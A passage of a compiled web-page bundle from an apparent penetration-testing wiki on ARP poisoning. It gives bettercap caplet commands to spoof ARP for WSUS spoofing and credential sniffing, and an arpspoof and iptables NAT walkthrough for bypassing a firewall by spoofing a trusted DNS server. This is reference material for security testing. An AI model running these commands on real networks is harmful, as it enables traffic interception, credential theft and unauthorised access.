`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"net.sniff"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," on")])])])],-1),s("p",null,"The caplet above can be loaded with the following command in order to launch the ARP poisoning attack.",-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"bettercap"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --iface"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $interface "),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"--caplet"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," wsus_spoofing.cap")])])])],-1),s("p",null,[e("The search for Windows updates can be manually triggered when having access to the target computer by going to "),s("code",null,"Settings > Update & Security > Windows Update > Check for updates"),e(".")],-1)])),_:1}),t(n,{label:"Dumping network secrets"},{default:a(()=>i[3]||(i[3]=[s("p",null,[e("Start "),s("a",{href:"https://github.com/lgandx/PCredz",target:"_blank",rel:"noreferrer"},"PCredz"),e(" or Wireshark then start the poisoning attack")],-1),s("div",{class:"language-bash vp-adaptive-theme"},[s("button",{title:"Copy Code",class:"copy"}),s("span",{class:"lang"},"bash"),s("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# quick recon of the network")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"net.probe"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," on")]),e(`
`),s("span",{class:"line"}),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# set the ARP poisoning")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"set"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," arp.spoof.targets"),s("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $client_ip")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"set"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," arp.spoof.internal"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," true")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"set"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," arp.spoof.fullduplex"),s("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," true")]),e(`
`),s("span",{class:"line"}),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# control logging and verbosity")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"events.ignore"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," endpoint")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"events.ignore"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," net.sniff.mdns")]),e(`
`),s("span",{class:"line"}),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# start the modules")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"arp.spoof"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," on")]),e(`
`),s("span",{class:"line"},[s("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"net.sniff"),s("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," on")])])])],-1)])),_:1})]),_:1}),i[5]||(i[5]=o('<details class="details custom-block"><summary>Alternative using <code>arpspoof</code> tool - Firewall Bypass scenario</summary><h4 id="combining-arp-poisoning-and-ip-spoofing-to-bypass-firewall" tabindex="-1">Combining ARP poisoning and IP spoofing to bypass firewall <a class="header-anchor" href="#combining-arp-poisoning-and-ip-spoofing-to-bypass-firewall" aria-label="Permalink to &quot;Combining ARP poisoning and IP spoofing to bypass firewall&quot;">‚Äã</a></h4><p>The goal of this attack is to bypass the firewall protecting a sensitive network and be able the access an asset there.</p><p>To do so, the attacker&#39;s machine sits as MITM between the DNS server (referred to as the target of the ARP Spoofing, which is authorized to communicate with the sensitive asset in the protected network), and the firewall controlling the access to the protected network.<br> In addition to this, the attacker spoofs the IP address of the DNS server when communicating with the sensitive asset and tags its traffic through dynamic ports to be able to track it and handle the response to its spoofed requests.</p><p>Below is a diagram to visualize the attack:</p><p><img src="'+d+`" alt="Bypass WAF through ARP spoofing and IP Spoofing - attack diagram"></p><p>IP spoofing</p><p>This part is done using <a href="https://www.djack.com.pl/Suse9hlp/ch26s03.html" target="_blank" rel="noreferrer">iptables</a> NAT rules.</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span># As refered to above, IP forwarding need to be enabled otherwise attacker&#39;s machine will drop the packets not containing its IP address as destination</span></span>
<span class="line"><span>sysctl net.ipv4.ip_forward=1</span></span>
<span class="line"><span># Change the source port range of the attacker host, this is only to make sure port range size is the same as the one of the spoofed traffic (20000-30000)</span></span>
<span class="line"><span>echo &quot;40000 50000&quot; &gt; /proc/sys/net/ipv4/ip_local_port_range </span></span>
<span class="line"><span># Spoof the source IP address of the outgoing traffic and modify the source ports to tag the spoofed traffic.</span></span>
<span class="line"><span>iptables -t nat -A POSTROUTING -s &quot;ATTACKER_IP&quot;/32 -o &quot;NETWORK_INTERFACE&quot; -p tcp -j SNAT --to-source &quot;TARGET_IP&quot;:20000-30000</span></span>
<span class="line"><span># Identify the response to the spoofed traffic and change destination IP of the target to the one of the attacker&#39;s host</span></span>
<span class="line"><span>iptables -t nat -A PREROUTING -d &quot;TARGET_IP&quot;/32 -i &quot;NETWORK_INTERFACE&quot; -p tcp -m tcp --dport 20000:30000 -j DNAT --to-destination &quot;ATTACKER_IP&quot;:40000-50000</span></span></code></pre></div><p>ARP spoofing (MITM)<br> To perform the ARP spoofing part, <a href="https://github.com/ickerwx/arpspoof" target="_blank" rel="noreferrer">arpspoof</a> (python2) is used. Both the DNS server and the firewall are poisoned (<a href="./arp-poisoning#proxy-vs.-rerouting">proxy mode</a>).</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span># Launch the ARP poisoning</span></span>
<span class="line"><span>arpspoof -i &quot;NETWORK_INTERFACE&quot; -t &quot;TARGET_IP&quot; -r &quot;FIREWALL_IP&quot;</span></span></code></pre></div><p>For more details about the attack, refer to the <a href="https://idafchev.github.io/pentest/2019/10/28/combining_arp_poisoning_and_ip_spoofing_to_bypass_firewalls.html" target="_blank" rel="noreferrer">&quot;Combining ARP poisoning and IP spoofing to bypass firewalls&quot; article</a> written by <a href="https://twitter.com/IliyaDafchev" target="_blank" rel="noreferrer">Llia Dafchev</a>.</p><p><em>Nota bene:</em> there are different ways of populating the NAT table regarding outgoing traffic IP translation; through the <code>POSTROUTING</code> chain, applied on all outgoing packets:</p><ol><li><code>MASQUERADE</code><em>:</em> this will indicate that the source IP of outgoing packets should be changed to the one of the network interface specified in <code>-o</code> argument.</li></ol><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">iptables</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -t</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> nat</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -A</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> POSTROUTING</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -o</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;NETWORK_INTERFACE&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -j</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> MASQUERADE</span></span></code></pre></div><ol start="2"><li><code>SNAT</code><em>:</em> this will indicate that the source IP of outgoing packets should be changed to the one specified in <code>--to</code> argument. Below is an example different from the one used in the attack descried above, where decision on the NAT rule to apply is based on destination (<code>-d</code> option) rather than the source (<code>-s</code> option).</li></ol><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">iptables</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -t</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> nat</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -I</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> POSTROUTING</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -d</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;TARGET_IP&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -j</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> SNAT</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> --to</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;MODIFIED_SOURCE_IP&quot;</span></span></code></pre></div></details><h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">‚Äã</a></h2><p><a href="http://g-laurent.blogspot.com/2016/10/introducing-responder-multirelay-10.html" target="_blank" rel="noreferrer">http://g-laurent.blogspot.com/2016/10/introducing-responder-multirelay-10.html</a></p><p><a href="https://luemmelsec.github.io/Relaying-101/#arp-spoofing" target="_blank" rel="noreferrer">https://luemmelsec.github.io/Relaying-101/#arp-spoofing</a></p><p><a href="https://www.bettercap.org/modules/ethernet/spoofers/arp.spoof/" target="_blank" rel="noreferrer">https://www.bettercap.org/modules/ethernet/spoofers/arp.spoof/</a></p><p><a href="https://ivanitlearning.wordpress.com/2019/04/07/arp-dns-poisoning-with-bettercap-and-impacket-ntlmrelayx/" target="_blank" rel="noreferrer">https://ivanitlearning.wordpress.com/2019/04/07/arp-dns-poisoning-with-bettercap-and-impacket-ntlmrelayx/</a></p><p><a href="https://idafchev.github.io/pentest/2019/10/28/combining_arp_poisoning_and_ip_spoofing_to_bypass_firewalls.html" target="_blank" rel="noreferrer">https://idafchev.github.io/pentest/2019/10/28/combining_arp_poisoning_and_ip_spoofing_to_bypass_firewalls.html</a></p>`,7))])}const w=h(c,[["render",g]]);export{C as __pageData,w as default};
